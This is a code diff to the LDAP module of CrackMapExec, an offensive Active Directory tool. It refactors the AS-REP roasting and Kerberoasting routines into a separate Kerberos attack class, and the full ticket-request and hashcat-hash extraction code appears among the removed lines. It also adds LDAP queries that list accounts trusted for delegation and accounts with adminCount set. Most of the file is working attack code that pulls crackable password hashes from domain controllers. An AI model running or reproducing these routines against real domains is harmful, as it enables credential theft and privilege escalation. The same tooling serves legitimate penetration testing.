@@ -1,28 +1,22 @@
 # from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
+# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf
 
 import requests
 import logging
 import configparser
-from pyasn1.codec.der import decoder, encoder
-from pyasn1.type.univ import noValue
 from cme.connection import *
 from cme.helpers.logger import highlight
 from cme.logger import CMEAdapter
+from cme.protocols.ldap.kerberos import KerberosAttacks
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb import SMB_DIALECT
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
-from impacket.examples import logger
-from impacket.krb5 import constants
-from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
 from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS
 from impacket.krb5.types import KerberosTime, Principal
-from impacket.krb5.asn1 import TGS_REP
-from impacket.krb5.ccache import CCache
 from impacket.ldap import ldap as ldap_impacket
+from impacket.krb5 import constants
 from impacket.ldap import ldapasn1 as ldapasn1_impacket
-from datetime import datetime,timedelta
 from io import StringIO
-from binascii import hexlify, unhexlify
 
 class ldap(connection):
 
@@ -31,6 +25,7 @@ class ldap(connection):
         self.server_os = None
         self.os_arch = 0
         self.hash = None
+        self.ldapConnection = None
         self.lmhash = ''
         self.nthash = ''
         self.baseDN = ''
@@ -56,7 +51,11 @@ class ldap(connection):
         
         egroup = ldap_parser.add_argument_group("Retrevie hash on the remote DC", "Options to get hashes from Kerberos")
         egroup.add_argument("--asreproast", help="Get AS_REP response ready to crack with hashcat")
-        egroup.add_argument("--kerberoasting", help='Get TGS ticket ready to crack with hashcatcc')
+        egroup.add_argument("--kerberoasting", help='Get TGS ticket ready to crack with hashcat')
+        
+        vgroup = ldap_parser.add_argument_group("Retrieve useful information on the domain", "Options to to play with Kerberos")
+        vgroup.add_argument("--trusted-for-auth", action="store_true", help="Get the list of users and computers with flag TRUSTED_FOR_DELEGATION")
+        vgroup.add_argument("--admin-count", action="store_true", help="Get objets that had the value adminCount=1")
 
         return parser
 
@@ -155,17 +154,17 @@ class ldap(connection):
             target = domain
 
         try:
-            ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
+            self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                 self.aesKey, kdcHost=self.kdcHost)
-            ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
+            self.ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                              self.__aesKey, kdcHost=self.__kdcHost)                                  
         except ldap_impacket.LDAPSessionError as e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
-                ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
-                ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
+                self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
+                self.ldapConnection.kerberosLogin(self.username, self.password, self.domain, self.lmhash, self.nthash,
                                                 self.aesKey, kdcHost=self.kdcHost)
-        self.search_as_rep(ldapConnection)
+        self.search_as_rep(self.ldapConnection)
         return True
 
 
@@ -185,22 +184,26 @@ class ldap(connection):
         else:
             target = domain
 
-        if self.kerberos is False and self.password == '' and self.args.asreproast:
-            self.getTGT_asroast(self.username)
-            return False
         # Connect to LDAP
         try:
-            ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
-            ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
+            self.ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % target, self.baseDN, self.kdcHost)
+            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
         except ldap_impacket.LDAPSessionError as e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
-                ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
-                ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
-        if self.args.asreproast:
-            self.search_as_rep(ldapConnection)
-        elif self.args.kerberoasting:
-            self.search_kerberoasting(ldapConnection)
+                self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % target, self.baseDN, self.kdcHost)
+                self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
+        try:
+            self.ldapConnection.search(searchFilter='(objectCategory=nop)')
+            out = u'{}{}:{}'.format('{}\\'.format(domain),
+                                    username,
+                                    password)
+            self.logger.success(out)
+        except ldap_impacket.LDAPSearchError as e:
+            if self.password != '':
+                self.logger.error("Authentication failed")
+            return False
+
         return True
 
     def create_smbv1_conn(self):
@@ -217,7 +220,38 @@ class ldap(connection):
 
         return True
 
-    def search_as_rep(self, ldapConnection):
+    def create_smbv3_conn(self):
+        try:
+            self.conn = SMBConnection(self.host, self.host, None, 445)
+            self.smbv1 = False
+        except socket.error:
+            return False
+        except Exception as e:
+            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
+            return False
+
+        return True
+
+    def create_conn_obj(self):
+        if self.create_smbv1_conn():
+            return True
+        elif self.create_smbv3_conn():
+            return True
+
+        return False
+
+    def getUnixTime(self, t):
+        t -= 116444736000000000
+        t /= 10000000
+        return t
+
+    def asreproast(self):
+        if self.kerberos is False and self.password == '' and self.args.asreproast:
+            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
+            self.logger.highlight(u'{}'.format(hash_TGT))
+            with open(self.args.asreproast, 'a+') as hash_asreproast:
+                hash_asreproast.write(hash_TGT + '\n')
+            return False
         # Building the search filter
         searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                     "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
@@ -225,7 +259,7 @@ class ldap(connection):
 
         try:
             logging.debug('Search Filter=%s' % searchFilter)
-            resp = ldapConnection.search(searchFilter=searchFilter,
+            resp = self.ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
@@ -237,7 +271,6 @@ class ldap(connection):
                 resp = e.getAnswers()
                 pass
             else:
-                self.logger.error("Authentication failed")
                 return False
 
         answers = []
@@ -279,18 +312,21 @@ class ldap(connection):
                 pass
         if len(answers)>0:
             for user in answers:
-                self.getTGT_asroast(user[0])
+                hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])
+                self.logger.highlight(u'{}'.format(hash_TGT))
+                with open(self.args.asreproast, 'a+') as hash_asreproast:
+                    hash_asreproast.write(hash_TGT + '\n')
             return True
         else:
             self.logger.error("No entries found!")
 
-    def search_kerberoasting(self, ldapConnection):
+    def kerberoasting(self):
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                        "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
 
         try:
-            resp = ldapConnection.search(searchFilter=searchFilter,
+            resp = self.ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['servicePrincipalName', 'sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                          sizeLimit=999)
@@ -302,8 +338,7 @@ class ldap(connection):
                 resp = e.getAnswers()
                 pass
             else:
-                self.logger.error("Authentication failed")
-                return
+                return False
 
         answers = []
         logging.debug('Total of records returned %d' % len(resp))
@@ -358,7 +393,7 @@ class ldap(connection):
 
         if len(answers)>0:
             users = dict( (vals[1], vals[0]) for vals in answers)
-            TGT = self.getTGT_kerberoasting()
+            TGT = KerberosAttacks(self).getTGT_kerberoasting()
             for user, SPN in users.items():
                 try:
                     serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
@@ -366,218 +401,139 @@ class ldap(connection):
                                                                             self.kdcHost,
                                                                             TGT['KDC_REP'], TGT['cipher'],
                                                                             TGT['sessionKey'])
-                    self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
+                    r = KerberosAttacks(self).outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
+                    self.logger.highlight(u'{}'.format(r))
+                    with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
+                        hash_kerberoasting.write(r + '\n')
                 except Exception as e:
                     logging.debug("Exception:", exc_info=True)
                     logging.error('SPN: %s - %s' % (SPN,str(e)))
         else:
-            print("No entries found!")
+            self.logger.error("No entries found!")
 
-    def create_smbv3_conn(self):
+    def trusted_for_auth(self):
+        # Building the search filter
+        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
         try:
-            self.conn = SMBConnection(self.host, self.host, None, 445)
-            self.smbv1 = False
-        except socket.error:
-            return False
-        except Exception as e:
-            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
-            return False
-
-        return True
-
-    def create_conn_obj(self):
-        if self.create_smbv1_conn():
-            return True
-        elif self.create_smbv3_conn():
-            return True
-
-        return False
-
-    def getUnixTime(self, t):
-        t -= 116444736000000000
-        t /= 10000000
-        return t
-
-    def getTGT_asroast(self, userName, requestPAC=True):
-
-        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-
-        asReq = AS_REQ()
-
-        domain = self.domain.upper()
-        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-
-        pacRequest = KERB_PA_PAC_REQUEST()
-        pacRequest['include-pac'] = requestPAC
-        encodedPacRequest = encoder.encode(pacRequest)
-
-        asReq['pvno'] = 5
-        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
-
-        asReq['padata'] = noValue
-        asReq['padata'][0] = noValue
-        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
-        asReq['padata'][0]['padata-value'] = encodedPacRequest
-
-        reqBody = seq_set(asReq, 'req-body')
-
-        opts = list()
-        opts.append(constants.KDCOptions.forwardable.value)
-        opts.append(constants.KDCOptions.renewable.value)
-        opts.append(constants.KDCOptions.proxiable.value)
-        reqBody['kdc-options'] = constants.encodeFlags(opts)
-
-        seq_set(reqBody, 'sname', serverName.components_to_asn1)
-        seq_set(reqBody, 'cname', clientName.components_to_asn1)
-
-        if domain == '':
-            logger.error('Empty Domain not allowed in Kerberos')
-            return
-
-        reqBody['realm'] = domain
-        now = datetime.utcnow() + timedelta(days=1)
-        reqBody['till'] = KerberosTime.to_asn1(now)
-        reqBody['rtime'] = KerberosTime.to_asn1(now)
-        reqBody['nonce'] = random.getrandbits(31)
-
-        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
-
-        seq_set_iter(reqBody, 'etype', supportedCiphers)
-
-        message = encoder.encode(asReq)
-
-        try:
-            r = sendReceive(message, domain, self.kdcHost)
-        except KerberosError as e:
-            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                # RC4 not available, OK, let's ask for newer types
-                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
-                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
-                seq_set_iter(reqBody, 'etype', supportedCiphers)
-                message = encoder.encode(asReq)
-                r = sendReceive(message, domain, self.kdcHost)
+            logging.debug('Search Filter=%s' % searchFilter)
+            resp = self.ldapConnection.search(searchFilter=searchFilter,
+                                        attributes=['sAMAccountName',
+                                                    'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
+                                        sizeLimit=999)
+        except ldap_impacket.LDAPSearchError as e:
+            if e.getErrorString().find('sizeLimitExceeded') >= 0:
+                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
+                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
+                # paged queries
+                resp = e.getAnswers()
+                pass
             else:
-                raise e
+                return False
+        answers = []
+        logging.debug('Total of records returned %d' % len(resp))
 
-        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
-        # 'Do not require Kerberos preauthentication' set
-        try:
-            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
-        except:
-            # Most of the times we shouldn't be here, is this a TGT?
-            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
-        else:
-            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
-            logging.debug('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
-            return
-
-        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
-        hash_TGT =  '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
-                                                hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
-                                                hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
-        self.logger.info(u'{}'.format(hash_TGT))
-        with open(self.args.asreproast, 'a+') as hash_asreproast:
-            if self.host not in hash_asreproast.read():
-                hash_asreproast.write(hash_TGT + '\n')
-        return ''
-
-    def getTGT_kerberoasting(self):
-        try:
-            ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
-        except:
-            # No cache present
-            pass
-        else:
-            # retrieve user and domain information from CCache file if needed
-            if self.domain == '':
-                domain = ccache.principal.realm['data']
-            else:
-                domain = self.__domain
-            logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
-            principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
-            creds = ccache.getCredential(principal)
-            if creds is not None:
-                TGT = creds.toTGT()
-                logging.debug('Using TGT from cache')
-                return TGT
-            else:
-                logging.debug("No valid credentials found in cache. ")
-
-        # No TGT in cache, request it
-        userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-
-        # In order to maximize the probability of getting session tickets with RC4 etype, we will convert the
-        # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
-        # cleartext password.
-        # If no clear text password is provided, we just go with the defaults.
-        if self.password != '' and (self.lmhash == '' and self.nthash == ''):
+        for item in resp:
+            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                continue
+            mustCommit = False
+            sAMAccountName =  ''
+            memberOf = ''
+            pwdLastSet = ''
+            userAccountControl = 0
+            lastLogon = 'N/A'
             try:
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.domain,
-                                                                compute_lmhash(self.password),
-                                                                compute_nthash(self.password), self.aesKey,
-                                                                kdcHost=self.kdcHost)
+                for attribute in item['attributes']:
+                    if str(attribute['type']) == 'sAMAccountName':
+                        sAMAccountName = str(attribute['vals'][0])
+                        mustCommit = True
+                    elif str(attribute['type']) == 'userAccountControl':
+                        userAccountControl = "0x%x" % int(attribute['vals'][0])
+                    elif str(attribute['type']) == 'memberOf':
+                        memberOf = str(attribute['vals'][0])
+                    elif str(attribute['type']) == 'pwdLastSet':
+                        if str(attribute['vals'][0]) == '0':
+                            pwdLastSet = '<never>'
+                        else:
+                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                    elif str(attribute['type']) == 'lastLogon':
+                        if str(attribute['vals'][0]) == '0':
+                            lastLogon = '<never>'
+                        else:
+                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                if mustCommit is True:
+                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
             except Exception as e:
-                logging.debug('TGT: %s' % str(e))
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
-                                                                    unhexlify(self.lmhash),
-                                                                    unhexlify(self.nthash), self.aesKey,
-                                                                    kdcHost=self.kdcHost)
-
+                logging.debug("Exception:", exc_info=True)
+                logging.debug('Skipping item, cannot process due to error %s' % str(e))
+                pass
+        if len(answers)>0:
+            logging.debug(answers)
+            for value in answers:
+                self.logger.highlight(value[0])
         else:
-            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.password, self.domain,
-                                                                unhexlify(self.lmhash),
-                                                                unhexlify(self.nthash), self.aesKey,
-                                                                kdcHost=self.kdcHost)
-        TGT = {}
-        TGT['KDC_REP'] = tgt
-        TGT['cipher'] = cipher
-        TGT['sessionKey'] = sessionKey
+            self.logger.error("No entries found!")
+        return
 
-        return TGT
+    def admin_count(self):
+        # Building the search filter
+        searchFilter = "(adminCount=1)"
+        try:
+            logging.debug('Search Filter=%s' % searchFilter)
+            resp = self.ldapConnection.search(searchFilter=searchFilter,
+                                        attributes=['sAMAccountName',
+                                                    'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
+                                        sizeLimit=999)
+        except ldap_impacket.LDAPSearchError as e:
+            if e.getErrorString().find('sizeLimitExceeded') >= 0:
+                logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
+                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
+                # paged queries
+                resp = e.getAnswers()
+                pass
+            else:
+                return False
+        answers = []
+        logging.debug('Total of records returned %d' % len(resp))
 
-    def outputTGS(self, tgs, oldSessionKey, sessionKey, username, spn, fd=None):
-        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-
-        # According to RFC4757 (RC4-HMAC) the cipher part is like:
-        # struct EDATA {
-        #       struct HEADER {
-        #               OCTET Checksum[16];
-        #               OCTET Confounder[8];
-        #       } Header;
-        #       OCTET Data[0];
-        # } edata;
-        #
-        # In short, we're interested in splitting the checksum and the rest of the encrypted data
-        #
-        # Regarding AES encryption type (AES128 CTS HMAC-SHA1 96 and AES256 CTS HMAC-SHA1 96)
-        # last 12 bytes of the encrypted ticket represent the checksum of the decrypted 
-        # ticket
-        if decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
-            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
-                constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode)
-        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
-                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
-        elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
-            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
-                constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
-                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
+        for item in resp:
+            if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
+                continue
+            mustCommit = False
+            sAMAccountName =  ''
+            memberOf = ''
+            pwdLastSet = ''
+            userAccountControl = 0
+            lastLogon = 'N/A'
+            try:
+                for attribute in item['attributes']:
+                    if str(attribute['type']) == 'sAMAccountName':
+                        sAMAccountName = str(attribute['vals'][0])
+                        mustCommit = True
+                    elif str(attribute['type']) == 'userAccountControl':
+                        userAccountControl = "0x%x" % int(attribute['vals'][0])
+                    elif str(attribute['type']) == 'memberOf':
+                        memberOf = str(attribute['vals'][0])
+                    elif str(attribute['type']) == 'pwdLastSet':
+                        if str(attribute['vals'][0]) == '0':
+                            pwdLastSet = '<never>'
+                        else:
+                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                    elif str(attribute['type']) == 'lastLogon':
+                        if str(attribute['vals'][0]) == '0':
+                            lastLogon = '<never>'
+                        else:
+                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                if mustCommit is True:
+                    answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
+            except Exception as e:
+                logging.debug("Exception:", exc_info=True)
+                logging.debug('Skipping item, cannot process due to error %s' % str(e))
+                pass
+        if len(answers)>0:
+            logging.debug(answers)
+            for value in answers:
+                self.logger.highlight(value[0])
         else:
-            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
-                decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
-                decodedTGS['ticket']['enc-part']['etype']))
+            self.logger.error("No entries found!")
+        return        
 
-        self.logger.info(u'{}'.format(entry))
-        with open(self.args.kerberoasting, 'a+') as hash_kerberoasting:
-            if self.host not in hash_kerberoasting.read():
-                hash_kerberoasting.write(entry + '\n')
